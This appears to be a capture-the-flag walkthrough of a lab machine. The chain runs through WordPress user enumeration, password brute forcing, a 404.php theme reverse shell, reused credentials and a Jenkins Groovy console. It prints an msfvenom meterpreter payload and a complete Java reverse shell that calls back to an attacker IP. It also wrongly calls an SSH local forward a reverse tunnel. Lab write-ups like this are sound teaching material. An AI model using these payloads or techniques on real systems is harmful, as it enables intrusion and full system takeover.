Enumerate internal. We find out that there are only two ports open 80 & 22. After scanning port 80(dirb/Nikto/Gobuster) we find that there is a blog. After seeing the links(wordpress) you can observe that it points to internal.thm. From there edit /etc/hosts to the IP assigned and revisit the website.  After a wpscan there are no cve's listed. However you can do user enaumeration with https://internal.thm/?author=X       We find that there is only one user admin.

Time to brute force. You can do this with Burp Suite Pro/hydra/wpscan. After the brute force we find the admin password and login. 

Getting a shell on a wordpress site is relatively straigtht forward(granted you have creds). Edit themes then find the 404.php template. After you find the template use pentest monkey's reverse shell or the meterpreter. 

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.64.199 LPORT=4444 > shell.php

use multi/handler
set payload php/meterpreter/reverse_tcp

Execute the script: 
internal.thm/blog/index.php/2020/08/03/6/
```


From there it's onto privillege escalation. There is a file located in the /opt/ directory that will give you some credentials to ecalate. It can be found by locate *.txt > search.txt. Linpeas was attempting to sort the hashes and froze. Once you have those credentials ssh with your new creds. Once you ssh in there will be jenkins.txt


Jenkins is a build tool used on Linux/Windows for development. If Jenkins is misconfigured you can get a shell on a machine. The note mentions 172.x.x.x:8080 I attempted to curl that command(while in ssh) and the connection was refused. However if you curl 127.0.0.1:8080 we see a login page, we can now infer that we need to access Jenkins through our attackbox.

ssh -L 8080:localhost:8080 aubreanna@10.10.174.30
^ is a reverse tunnel

```
String host="10.10.64.199";
int port=4444;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```


From there brute force with the user admin again and get access to the jenkins machine. From there 127.0.0.1:8080/script will present you with a console. Time to get another reverse shell. Once you are the user jenkins access another /opt/ and you will find the root credentials. From there ssh into the machine as the root user and grab the flag.


locate *.txt > search.txt
